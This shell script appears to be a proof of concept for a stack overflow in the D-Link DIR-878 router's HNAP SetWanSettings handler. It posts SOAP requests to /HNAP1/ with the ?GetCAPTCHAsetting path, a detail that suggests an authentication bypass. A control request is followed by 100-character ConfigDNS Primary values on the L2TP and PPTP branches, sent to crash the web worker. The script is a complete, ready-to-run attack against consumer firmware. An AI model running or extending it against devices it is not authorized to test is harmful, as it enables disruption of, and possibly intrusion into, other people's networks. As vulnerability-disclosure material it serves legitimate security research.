#!/bin/sh
# Reproduction script for: DIR-878 SetWanSettings ConfigDNS overflow on L2TP/PPTP branches
# Derived from the requests recorded in README.md. Non-destructive: crash cases leave no
# persistent change; the FastCGI worker restarts automatically.
# Authorized testing only.
T="${1:?usage: sh poc.sh <router-ip>}"
post() {
  curl -s -o /dev/null -w "    HTTP %{http_code}\n" -X POST "http://$T/HNAP1/?GetCAPTCHAsetting" \
    -H 'SOAPAction: "http://purenetworks.com/HNAP1/SetWanSettings"' \
    -H 'Content-Type: text/xml' --data-binary "$1"
}
mk() { # $1 = type, $2 = Primary
cat <<XML
<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><SetWanSettings xmlns="http://purenetworks.com/HNAP1/"><Type>$1</Type><ConfigDNS><Primary>$2</Primary><Secondary>2.2.2.2</Secondary></ConfigDNS><MTU>1400</MTU><Username>user</Username><Password>pass123</Password><AutoReconnect>false</AutoReconnect><MaxIdleTime>0</MaxIdleTime><IPAddress>10.0.0.2</IPAddress><SubnetMask>255.255.255.0</SubnetMask><Gateway>10.0.0.1</Gateway><ServiceName>svc</ServiceName><MacAddress>00:11:22:33:44:55</MacAddress></SetWanSettings></soap:Body></soap:Envelope>
XML
}
echo "[*] Control L2TP Primary=1.1.1.1 - expect 200 OK"
post "$(mk L2TP 1.1.1.1)"
echo "[*] Attack  L2TP Primary=100xA - expect 500 + core"
post "$(mk L2TP $(printf 'A%.0s' $(seq 100)))"
echo "[*] Attack  PPTP Primary=100xC - expect 500 + core"
post "$(mk PPTP $(printf 'C%.0s' $(seq 100)))"
